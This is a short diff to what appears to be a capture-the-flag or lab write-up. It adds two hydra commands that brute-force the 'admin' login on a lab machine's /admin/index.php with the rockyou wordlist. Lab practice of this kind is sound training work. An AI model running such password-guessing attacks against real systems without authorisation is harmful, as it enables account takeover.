@@ -40,3 +40,6 @@ What is the hidden directory?
 ![](../../img/Pasted%20image%2020220828045211.png)
 
 
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=incorrect" -V         
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.166.204 http-post-form “/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid” -V
